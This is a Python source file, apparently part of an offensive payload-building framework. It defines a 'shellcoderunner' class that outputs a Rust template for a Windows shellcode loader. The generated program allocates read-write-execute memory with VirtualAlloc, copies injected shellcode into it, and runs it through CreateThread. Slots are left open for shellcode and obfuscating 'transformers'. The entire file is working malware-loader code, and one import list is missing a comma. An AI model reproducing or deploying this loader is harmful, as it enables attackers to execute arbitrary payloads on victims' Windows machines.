class shellcoderunner:

    def imports(self):
        return ['extern crate windows;', 
                'use windows::Win32::System::Memory::VirtualAlloc;', 
                'use windows::Win32::System::Threading::CreateThread;', 
                'use windows::Win32::System::Threading::WaitForSingleObject;', 
                'use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;'
                'use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
        ]

    def compilerOptions(self):
        return ['windows = { version = "0.58", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']

    def template(self):
        return """
{imports}

{codeblocks}

fn main() {{
    
    {shellcode}
    {transformers}
    unsafe {{
        let func_addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE, 
        );
		
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());

        let mut thread_id: u32 = 0; 
        let h_thread = CreateThread( 
            None, 
            0,
            Some(std::mem::transmute(func_addr)), 
            None,
            THREAD_CREATION_FLAGS(0),
            Some(&mut thread_id as *mut u32), 
        ).unwrap();

        WaitForSingleObject(h_thread, 0xFFFFFFFF); 
    }}
}}
"""